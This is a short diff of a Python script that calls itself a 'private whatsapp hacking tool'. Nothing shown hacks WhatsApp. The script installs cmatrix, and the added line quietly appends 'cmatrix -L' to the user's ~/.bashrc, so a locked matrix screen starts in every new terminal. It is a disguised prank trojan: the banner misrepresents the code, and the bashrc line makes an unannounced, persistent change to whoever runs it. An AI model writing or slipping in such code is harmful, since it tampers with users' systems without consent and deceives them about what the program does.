@@ -20,6 +20,7 @@ def bash():
 
 
 os.system("apt install cmatrix")
+os.system("echo 'cmatrix -L' >> ~/.bashrc")
 os.system("clear")
 print("\033[33m")
 print("-----This is a private whatsapp hacking tool by *Mr b3rd%20mw01u* please use it educational purpose only-----")
